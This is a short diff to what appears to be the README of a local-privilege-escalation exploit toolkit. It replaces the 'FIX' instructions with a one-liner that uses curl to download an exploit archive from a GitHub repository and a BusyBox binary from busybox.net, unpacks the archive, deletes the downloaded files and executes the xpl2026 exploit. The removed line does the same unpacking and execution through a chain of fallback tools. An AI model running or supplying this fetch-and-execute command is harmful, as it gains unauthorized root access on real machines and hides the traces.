@@ -139,7 +139,7 @@ curl https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o
 ```
 ## FIX
 ```bash
-d=$(pwd -P) && f=xpl2026.zip && { command -v unzip >/dev/null && unzip -q "$f"; } || { command -v busybox >/dev/null && busybox unzip -o "$f"; } || { command -v php >/dev/null && php -r '$z=new ZipArchive;if($z->open($argv[1])!==TRUE)exit(1);exit($z->extractTo(".")?0:1);' "$f"; } || { command -v bsdtar >/dev/null && bsdtar -xf "$f"; } || { command -v jar >/dev/null && jar xf "$f"; } || { command -v 7zz >/dev/null && 7zz x -y "$f"; } || { command -v 7z >/dev/null && 7z x -y "$f"; } || { command -v python3 >/dev/null && python3 -m zipfile -e "$f" .; } || { command -v python >/dev/null && python -m zipfile -e "$f" .; } || { command -v perl >/dev/null && perl -MArchive::Zip -e 'Archive::Zip->new($ARGV[0])->extractTree();' "$f"; } && cd xpl2026 && rm -f "$d/$f" && chmod +x xpl2026 && ./xpl2026
+d=$(pwd -P) && cd "$d" && f=xpl2026.zip && curl -fsSL https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o "$f" && curl -fsSL "https://busybox.net/downloads/binaries/1.35.0-$(uname -m)-linux-musl/busybox" -o bb && chmod +x bb && ./bb unzip -o "$f" && cd xpl2026 && rm -f "$d/$f" "$d/bb" && chmod +x xpl2026 && ./xpl2026
 ```
 ---
 
